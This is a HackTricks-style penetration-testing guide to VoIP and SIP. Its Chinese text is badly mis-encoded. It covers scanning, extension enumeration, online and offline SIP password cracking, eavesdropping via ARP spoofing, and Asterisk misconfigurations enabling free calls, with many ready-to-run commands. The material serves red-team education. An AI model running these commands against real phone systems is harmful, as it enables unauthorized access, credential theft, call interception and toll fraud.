# VoIPæ¸—é€æµ‹è¯•

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## VoIPåŸºæœ¬ä¿¡æ¯

è¦å¼€å§‹å­¦ä¹ VoIPçš„å·¥ä½œåŸç†ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## åŸºæœ¬æ¶ˆæ¯
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## å“åº”ä»£ç 

**1xxâ€”ä¸´æ—¶å“åº”**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxâ€”æˆåŠŸå“åº”**
```
200 OK
202 Accepted
204 No Notification
```
**3xxâ€”é‡å®šå‘å“åº”**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxâ€”å®¢æˆ·ç«¯é”™è¯¯å“åº”**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxâ€”æœåŠ¡å™¨æ•…éšœå“åº”**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxâ€”å…¨å±€å¤±è´¥å“åº”**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIPæšä¸¾

### ç”µè¯å·ç 

çº¢é˜Ÿå¯ä»¥æ‰§è¡Œçš„ç¬¬ä¸€æ­¥æ˜¯ä½¿ç”¨OSINTå·¥å…·ã€Googleæœç´¢æˆ–æŠ“å–ç½‘é¡µæ¥æœç´¢å¯ç”¨ç”µè¯å·ç ä»¥è”ç³»å…¬å¸ã€‚

ä¸€æ—¦è·å¾—ç”µè¯å·ç ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨åœ¨çº¿æœåŠ¡æ¥è¯†åˆ«è¿è¥å•†ï¼š

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

äº†è§£è¿è¥å•†æ˜¯å¦æä¾›VoIPæœåŠ¡ï¼Œæ‚¨å¯ä»¥ç¡®å®šå…¬å¸æ˜¯å¦æ­£åœ¨ä½¿ç”¨VoIP...æ­¤å¤–ï¼Œå…¬å¸å¯èƒ½æ²¡æœ‰é›‡ç”¨VoIPæœåŠ¡ï¼Œè€Œæ˜¯ä½¿ç”¨PSTNå¡å°†å…¶VoIP PBXè¿æ¥åˆ°ä¼ ç»Ÿç”µè¯ç½‘ç»œã€‚

è¯¸å¦‚éŸ³ä¹çš„è‡ªåŠ¨å“åº”é€šå¸¸è¡¨æ˜æ­£åœ¨ä½¿ç”¨VoIPã€‚

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT ä¿¡æ¯

ä»»ä½•å…¶ä»–æœ‰åŠ©äºè¯†åˆ«æ­£åœ¨ä½¿ç”¨çš„ VoIP è½¯ä»¶çš„ OSINT æšä¸¾å¯¹äºçº¢é˜Ÿéƒ½æ˜¯æœ‰å¸®åŠ©çš„ã€‚

### ç½‘ç»œæšä¸¾

- **`nmap`** èƒ½å¤Ÿæ‰«æ UDP æœåŠ¡ï¼Œä½†ç”±äºæ‰«æçš„ UDP æœåŠ¡æ•°é‡è¾ƒå¤šï¼Œé€Ÿåº¦å¾ˆæ…¢ï¼Œå¹¶ä¸”å¯èƒ½å¯¹è¿™ç§ç±»å‹çš„æœåŠ¡ä¸å¤ªå‡†ç¡®ã€‚
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** æ¥è‡ª SIPVicious (`sudo apt install sipvicious`)ï¼šå°†å®šä½æŒ‡å®šç½‘ç»œä¸­çš„ SIP æœåŠ¡ã€‚
* `svmap` **æ˜“äºé˜»æ­¢**ï¼Œå› ä¸ºå®ƒä½¿ç”¨ User-Agent `friendly-scanner`ï¼Œä½†æ‚¨å¯ä»¥ä¿®æ”¹ `/usr/share/sipvicious/sipvicious` ä¸­çš„ä»£ç å¹¶è¿›è¡Œæ›´æ”¹ã€‚
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** SIPPTSæ‰«ææ˜¯ä¸€ä¸ªéå¸¸å¿«é€Ÿçš„ç”¨äºUDPã€TCPæˆ–TLSä¸Šçš„SIPæœåŠ¡çš„æ‰«æå™¨ã€‚å®ƒä½¿ç”¨å¤šçº¿ç¨‹ï¼Œå¯ä»¥æ‰«æå¤§èŒƒå›´çš„ç½‘ç»œã€‚å®ƒå…è®¸è½»æ¾æŒ‡å®šç«¯å£èŒƒå›´ï¼Œæ‰«æTCPå’ŒUDPï¼Œä½¿ç”¨å¦ä¸€ç§æ–¹æ³•ï¼ˆé»˜è®¤æƒ…å†µä¸‹å°†ä½¿ç”¨OPTIONSï¼‰å¹¶æŒ‡å®šä¸åŒçš„ç”¨æˆ·ä»£ç†ï¼ˆç­‰ç­‰ï¼‰ã€‚
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**ï¼š
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### é¢å¤–ç½‘ç»œæšä¸¾

PBXè¿˜å¯èƒ½æš´éœ²å…¶ä»–ç½‘ç»œæœåŠ¡ï¼Œä¾‹å¦‚ï¼š

- **69/UDP (TFTP)**ï¼šå›ºä»¶æ›´æ–°
- **80 (HTTP) / 443 (HTTPS)**ï¼šé€šè¿‡Webç®¡ç†è®¾å¤‡
- **389 (LDAP)**ï¼šç”¨äºå­˜å‚¨ç”¨æˆ·ä¿¡æ¯çš„æ›¿ä»£æ–¹æ³•
- **3306 (MySQL)**ï¼šMySQLæ•°æ®åº“
- **5038 (Manager)**ï¼šå…è®¸ä»å…¶ä»–å¹³å°ä½¿ç”¨Asterisk
- **5222 (XMPP)**ï¼šä½¿ç”¨Jabberå‘é€æ¶ˆæ¯
- **5432 (PostgreSQL)**ï¼šPostgreSQLæ•°æ®åº“
- ä»¥åŠå…¶ä»–...

### æ–¹æ³•æšä¸¾

å¯ä»¥ä½¿ç”¨[sippts](https://github.com/Pepelux/sippts)ä¸­çš„`SIPPTS enumerate`æ¥æŸ¥æ‰¾åœ¨PBXä¸­å¯ç”¨çš„**æ–¹æ³•**ã€‚
```bash
sippts enumerate -i 10.10.0.10
```
### åˆ†ææœåŠ¡å™¨å“åº”

éå¸¸é‡è¦çš„æ˜¯åˆ†ææœåŠ¡å™¨å‘é€ç»™æˆ‘ä»¬çš„æ ‡å¤´ï¼Œè¿™å–å†³äºæˆ‘ä»¬å‘é€çš„æ¶ˆæ¯ç±»å‹å’Œæ ‡å¤´ã€‚ä½¿ç”¨[sippts](https://github.com/Pepelux/sippts)ä¸­çš„`SIPPTS send`ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸ªæ€§åŒ–æ¶ˆæ¯ï¼Œæ“çºµæ‰€æœ‰æ ‡å¤´ï¼Œå¹¶åˆ†æå“åº”ã€‚
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
ä¹Ÿå¯ä»¥é€šè¿‡WebSocket è·å–æ•°æ®ã€‚ä½¿ç”¨ [**sippts**](https://github.com/Pepelux/sippts) ä¸­çš„ `SIPPTS wssend`ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸ªæ€§åŒ–çš„ WS æ¶ˆæ¯ã€‚
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### åˆ†æœºæšä¸¾

åœ¨ PBXï¼ˆä¸“ç”¨åˆ†æ”¯äº¤æ¢ï¼‰ç³»ç»Ÿä¸­ï¼Œåˆ†æœºæ˜¯æŒ‡åˆ†é…ç»™ç»„ç»‡æˆ–ä¼ä¸šå†…éƒ¨ç”µè¯çº¿ã€è®¾å¤‡æˆ–ç”¨æˆ·çš„**ç‹¬ç‰¹å†…éƒ¨æ ‡è¯†ç¬¦**ã€‚åˆ†æœºä½¿å¾—å¯ä»¥**åœ¨ç»„ç»‡å†…éƒ¨æœ‰æ•ˆåœ°è·¯ç”±ç”µè¯**ï¼Œè€Œæ— éœ€ä¸ºæ¯ä¸ªç”¨æˆ·æˆ–è®¾å¤‡åˆ†é…å•ç‹¬çš„å¤–éƒ¨ç”µè¯å·ç ã€‚

- **`svwar`** æ¥è‡ª SIPViciousï¼ˆ`sudo apt install sipvicious`ï¼‰ï¼š`svwar` æ˜¯ä¸€ä¸ªå…è´¹çš„ SIP PBX åˆ†æœºæ‰«æå·¥å…·ã€‚åœ¨æ¦‚å¿µä¸Šï¼Œå®ƒç±»ä¼¼äºä¼ ç»Ÿçš„æˆ˜æœ¯æ‹¨å·å™¨ï¼Œé€šè¿‡**çŒœæµ‹ä¸€ç³»åˆ—åˆ†æœºæˆ–ç»™å®šçš„åˆ†æœºåˆ—è¡¨**æ¥å·¥ä½œã€‚
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** SIPPTS exten ç”¨äºè¯†åˆ« SIP æœåŠ¡å™¨ä¸Šçš„åˆ†æœºã€‚Sipexten å¯ä»¥æ£€æŸ¥å¤§å‹ç½‘ç»œå’Œç«¯å£èŒƒå›´ã€‚
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: æ‚¨è¿˜å¯ä»¥ä½¿ç”¨metasploitæšä¸¾æ‰©å±•å/ç”¨æˆ·åï¼š
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** æ˜¯ä¸€ç§ç”¨äº Inter Asterisk Exchange åè®®çš„**ç”¨æˆ·åæš´åŠ›ç ´è§£æšä¸¾å™¨**ã€‚enumIAX å¯ä»¥ä»¥ä¸¤ç§ä¸åŒçš„æ¨¡å¼è¿è¡Œï¼›é¡ºåºç”¨æˆ·åçŒœæµ‹æˆ–å­—å…¸æ”»å‡»ã€‚
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP æ”»å‡»

### å¯†ç æš´åŠ›ç ´è§£ - åœ¨çº¿

å‘ç°äº† **PBX** å’Œä¸€äº› **åˆ†æœºå·/ç”¨æˆ·å** åï¼Œçº¢é˜Ÿå¯ä»¥å°è¯•ä½¿ç”¨å¸¸è§å¯†ç å­—å…¸å¯¹ä¸€ä¸ªåˆ†æœºå·è¿›è¡Œ **`REGISTER` æ–¹æ³•è®¤è¯** çš„å°è¯•æ¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œ**ç”¨æˆ·å** å¯èƒ½ä¸åˆ†æœºå·ç›¸åŒï¼Œä½†è¿™ç§åšæ³•å¯èƒ½ä¼šå›  PBX ç³»ç»Ÿã€å…¶é…ç½®å’Œç»„ç»‡åå¥½è€Œæœ‰æ‰€ä¸åŒ...

å¦‚æœç”¨æˆ·åä¸åˆ†æœºå·ä¸åŒï¼Œæ‚¨å°†éœ€è¦ **æ‰¾å‡ºç”¨æˆ·åä»¥è¿›è¡Œæš´åŠ›ç ´è§£**ã€‚
{% endhint %}

* **`svcrack`** æ¥è‡ª SIPVicious (`sudo apt install sipvicious`)ï¼šSVCrack å…è®¸æ‚¨ç ´è§£ PBX ä¸Šç‰¹å®šç”¨æˆ·å/åˆ†æœºå·çš„å¯†ç ã€‚
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** SIPPTS rcrack æ˜¯ç”¨äº SIP æœåŠ¡çš„è¿œç¨‹å¯†ç ç ´è§£å·¥å…·ã€‚Rcrack å¯ä»¥æµ‹è¯•ä¸åŒ IP å’Œç«¯å£èŒƒå›´ä¸­å¤šä¸ªç”¨æˆ·çš„å¯†ç ã€‚
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
### VoIPçªƒå¬

å¦‚æœæ‚¨åœ¨**å¼€æ”¾çš„Wifiç½‘ç»œ**ä¸­å‘ç°VoIPè®¾å¤‡ï¼Œæ‚¨å¯ä»¥**çªƒå–æ‰€æœ‰ä¿¡æ¯**ã€‚æ­¤å¤–ï¼Œå¦‚æœæ‚¨åœ¨ä¸€ä¸ªæ›´å°é—­çš„ç½‘ç»œä¸­ï¼ˆé€šè¿‡ä»¥å¤ªç½‘è¿æ¥æˆ–å—ä¿æŠ¤çš„Wifiè¿æ¥ï¼‰ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œ**ä¸­é—´äººæ”»å‡»ï¼Œä¾‹å¦‚**[**ARPæ¬ºéª—**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)åœ¨**PBXå’Œç½‘å…³ä¹‹é—´**ä»¥ä¾¿çªƒå–ä¿¡æ¯ã€‚

åœ¨ç½‘ç»œä¿¡æ¯ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ç”¨äºç®¡ç†è®¾å¤‡çš„**webå‡­æ®**ï¼Œç”¨æˆ·**åˆ†æœºå·**ï¼Œ**ç”¨æˆ·å**ï¼Œ**IP**åœ°å€ï¼Œç”šè‡³**å“ˆå¸Œå¯†ç **å’Œæ‚¨å¯ä»¥é‡ç°çš„**RTPæ•°æ®åŒ…**ä»¥**å¬å–å¯¹è¯**ç­‰ç­‰ã€‚

è¦è·å–è¿™äº›ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¯¸å¦‚Wiresharkã€tcpdumpä¹‹ç±»çš„å·¥å…·...ä½†ä¸€ä¸ª**ä¸“é—¨åˆ›å»ºçš„ç”¨äºçªƒå¬VoIPå¯¹è¯çš„å·¥å…·æ˜¯**[**ucsniff**](https://github.com/Seabreg/ucsniff)ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå¦‚æœ**SIPé€šä¿¡ä¸­ä½¿ç”¨TLS**ï¼Œæ‚¨å°†æ— æ³•æ¸…æ¥šåœ°çœ‹åˆ°SIPé€šä¿¡ã€‚\
å¦‚æœä½¿ç”¨**SRTP**å’Œ**ZRTP**ï¼Œ**RTPæ•°æ®åŒ…å°†ä¸ä¼šä»¥æ˜æ–‡å½¢å¼æ˜¾ç¤º**ã€‚
{% endhint %}

#### SIPå‡­æ®ï¼ˆå¯†ç æš´åŠ›ç ´è§£ - ç¦»çº¿ï¼‰

[æŸ¥çœ‹æ­¤ç¤ºä¾‹ä»¥æ›´å¥½åœ°äº†è§£**SIP REGISTERé€šä¿¡**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example)ä»¥äº†è§£**å‡­æ®æ˜¯å¦‚ä½•å‘é€çš„**ã€‚

* **`sipdump`** å’Œ **`sipcrack`,** æ˜¯**sipcrack**çš„ä¸€éƒ¨åˆ†ï¼ˆ`apt-get install sipcrack`ï¼‰ï¼šè¿™äº›å·¥å…·å¯ä»¥ä»**pcap**ä¸­**æå–**SIPåè®®ä¸­çš„**æ‘˜è¦è®¤è¯**ï¼Œå¹¶å¯¹å…¶è¿›è¡Œ**æš´åŠ›ç ´è§£**ã€‚
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** SIPPTS dump å¯ä»¥ä»ä¸€ä¸ª pcap æ–‡ä»¶ä¸­æå–æ‘˜è¦è®¤è¯ã€‚
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** SIPPTS dcrack æ˜¯ä¸€ä¸ªç”¨äºç ´è§£ä½¿ç”¨ SIPPTS dump è·å¾—çš„æ‘˜è¦è®¤è¯çš„å·¥å…·ã€‚
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** SIPPTS tshark ä» PCAP æ–‡ä»¶ä¸­æå– SIP åè®®çš„æ•°æ®ã€‚
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF codes

**ä¸ä»…å¯ä»¥åœ¨ç½‘ç»œæµé‡ä¸­æ‰¾åˆ° SIP å‡­æ®**ï¼Œè¿˜å¯ä»¥æ‰¾åˆ°ç”¨äºè®¿é—®**è¯­éŸ³ä¿¡ç®±**çš„ DTMF ä»£ç ã€‚\
å¯ä»¥å°†è¿™äº›ä»£ç å‘é€åœ¨**INFO SIP æ¶ˆæ¯**ä¸­ï¼Œä»¥**éŸ³é¢‘**æˆ–è€…**RTP æ•°æ®åŒ…**çš„å½¢å¼ã€‚å¦‚æœè¿™äº›ä»£ç åœ¨ RTP æ•°æ®åŒ…ä¸­ï¼Œæ‚¨å¯ä»¥æˆªå–å¯¹è¯çš„è¿™éƒ¨åˆ†å†…å®¹ï¼Œå¹¶ä½¿ç”¨å·¥å…· multimo æ¥æå–å®ƒä»¬ï¼š
```bash
multimon -a DTMF -t wac pin.wav
```
### å…è´¹é€šè¯ / Asterisks è¿æ¥é…ç½®é”™è¯¯

åœ¨ Asterisk ä¸­ï¼Œå¯ä»¥å…è®¸æ¥è‡ª**ç‰¹å®š IP åœ°å€**æˆ–**ä»»ä½• IP åœ°å€**çš„è¿æ¥ï¼š
```
host=10.10.10.10
host=dynamic
```
å¦‚æœæŒ‡å®šäº†IPåœ°å€ï¼Œä¸»æœº**ä¸éœ€è¦å®šæœŸå‘é€REGISTER**è¯·æ±‚ï¼ˆåœ¨REGISTERæ•°æ®åŒ…ä¸­å‘é€çš„ç”Ÿå­˜æ—¶é—´é€šå¸¸ä¸º30åˆ†é’Ÿï¼Œè¿™æ„å‘³ç€åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œç”µè¯å°†éœ€è¦æ¯30åˆ†é’Ÿè¿›è¡Œæ³¨å†Œï¼‰ã€‚ä½†æ˜¯ï¼Œå®ƒéœ€è¦æ‰“å¼€ç«¯å£ï¼Œå…è®¸æ¥è‡ªVoIPæœåŠ¡å™¨çš„è¿æ¥ä»¥æ¥å¬ç”µè¯ã€‚

è¦å®šä¹‰ç”¨æˆ·ï¼Œå¯ä»¥å®šä¹‰ä¸ºï¼š

- **`type=user`**ï¼šç”¨æˆ·åªèƒ½ä½œä¸ºç”¨æˆ·æ¥æ”¶å‘¼å«ã€‚
- **`type=friend`**ï¼šå¯ä»¥ä½œä¸ºå¯¹ç­‰ä½“æ‰§è¡Œå‘¼å«å¹¶ä½œä¸ºç”¨æˆ·æ¥æ”¶å‘¼å«ï¼ˆä¸åˆ†æœºä¸€èµ·ä½¿ç”¨ï¼‰
- **`type=peer`**ï¼šå¯ä»¥ä½œä¸ºå¯¹ç­‰ä½“å‘é€å’Œæ¥æ”¶å‘¼å«ï¼ˆSIP-trunksï¼‰

è¿˜å¯ä»¥é€šè¿‡ä¸å®‰å…¨çš„å˜é‡å»ºç«‹ä¿¡ä»»ï¼š

- **`insecure=port`**ï¼šå…è®¸é€šè¿‡IPéªŒè¯å¯¹ç­‰è¿æ¥ã€‚
- **`insecure=invite`**ï¼šä¸éœ€è¦å¯¹INVITEæ¶ˆæ¯è¿›è¡Œèº«ä»½éªŒè¯
- **`insecure=port,invite`**ï¼šä¸¤è€…éƒ½éœ€è¦

{% hint style="warning" %}
å½“ä½¿ç”¨**`type=friend`**æ—¶ï¼Œ**ä¸»æœº**å˜é‡çš„**å€¼å°†ä¸ä¼šè¢«ä½¿ç”¨**ï¼Œå› æ­¤ï¼Œå¦‚æœç®¡ç†å‘˜**é”™è¯¯é…ç½®äº†ä½¿ç”¨è¯¥å€¼çš„SIP-trunk**ï¼Œ**ä»»ä½•äººéƒ½å¯ä»¥è¿æ¥åˆ°å®ƒ**ã€‚

ä¾‹å¦‚ï¼Œæ­¤é…ç½®å°†å­˜åœ¨æ¼æ´ï¼š\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### å…è´¹é€šè¯ / Asterisks ä¸Šä¸‹æ–‡é”™è¯¯é…ç½®

åœ¨Asteriskä¸­ï¼Œ**ä¸Šä¸‹æ–‡**æ˜¯æ‹¨å·è®¡åˆ’ä¸­çš„å‘½åå®¹å™¨æˆ–éƒ¨åˆ†ï¼Œ**å°†ç›¸å…³çš„åˆ†æœºã€åŠ¨ä½œå’Œè§„åˆ™åˆ†ç»„åœ¨ä¸€èµ·**ã€‚æ‹¨å·è®¡åˆ’æ˜¯Asteriskç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ï¼Œå› ä¸ºå®ƒå®šä¹‰äº†**å¦‚ä½•å¤„ç†å’Œè·¯ç”±ä¼ å…¥å’Œä¼ å‡ºçš„å‘¼å«**ã€‚ä¸Šä¸‹æ–‡ç”¨äºç»„ç»‡æ‹¨å·è®¡åˆ’ï¼Œç®¡ç†è®¿é—®æ§åˆ¶ï¼Œå¹¶åœ¨ç³»ç»Ÿçš„ä¸åŒéƒ¨åˆ†ä¹‹é—´æä¾›åˆ†éš”ã€‚

æ¯ä¸ªä¸Šä¸‹æ–‡åœ¨é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ï¼Œé€šå¸¸åœ¨**`extensions.conf`**æ–‡ä»¶ä¸­ã€‚ä¸Šä¸‹æ–‡ç”±æ–¹æ‹¬å·è¡¨ç¤ºï¼Œå…¶ä¸­åŒ…å«ä¸Šä¸‹æ–‡åç§°ã€‚ä¾‹å¦‚ï¼š
```bash
csharpCopy code[my_context]
```
åœ¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ‚¨å®šä¹‰åˆ†æœºï¼ˆæ‹¨å·å·ç çš„æ¨¡å¼ï¼‰å¹¶å°†å®ƒä»¬ä¸ä¸€ç³»åˆ—æ“ä½œæˆ–åº”ç”¨ç¨‹åºå…³è”èµ·æ¥ã€‚è¿™äº›æ“ä½œå†³å®šäº†å‘¼å«çš„å¤„ç†æ–¹å¼ã€‚ä¾‹å¦‚ï¼š
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
è¿™ä¸ªç¤ºä¾‹æ¼”ç¤ºäº†ä¸€ä¸ªåä¸º"my\_context"çš„ç®€å•ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªåˆ†æœº"100"ã€‚å½“æœ‰äººæ‹¨æ‰“100æ—¶ï¼Œé€šè¯å°†è¢«æ¥å¬ï¼Œæ’­æ”¾æ¬¢è¿æ¶ˆæ¯ï¼Œç„¶åé€šè¯å°†è¢«ç»ˆæ­¢ã€‚

è¿™æ˜¯**å¦ä¸€ä¸ªä¸Šä¸‹æ–‡**ï¼Œå…è®¸**æ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç **ï¼š
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
å¦‚æœç®¡ç†å‘˜å°†**é»˜è®¤ä¸Šä¸‹æ–‡**å®šä¹‰ä¸ºï¼š
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
ä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨**æœåŠ¡å™¨æ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç **ï¼ˆæœåŠ¡å™¨ç®¡ç†å‘˜å°†ä¸ºé€šè¯ä»˜è´¹ï¼‰ã€‚
{% endhint %}

{% hint style="danger" %}
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹**`sip.conf`**æ–‡ä»¶åŒ…å«**`allowguest=true`**ï¼Œå› æ­¤**ä»»ä½•**æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…éƒ½å¯ä»¥æ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç ã€‚
{% endhint %}

